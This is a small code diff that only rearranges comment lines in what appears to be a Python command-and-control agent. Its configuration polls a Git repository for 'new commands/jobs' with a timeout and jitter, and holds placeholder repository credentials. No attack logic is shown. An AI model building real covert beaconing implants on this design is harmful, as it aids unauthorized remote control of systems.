@@ -65,8 +65,6 @@ from Crypto import Random
 
 ######################################################
 
-
-#######################################
 myrepo = 'my_repository'
 username = 'my_username'
 access_token = 'my_api_token'
@@ -75,8 +73,8 @@ GIT_KNOCK_TIMEOUT = 60  # seconds - check for new commands/jobs every GIT_KNOCK_
 JITTER = 100
 TAG = 'RELEASE'
 VERSION = '1.0.0'
-#######################################
 
+#######################################
 
 class InfoSecurity:
     
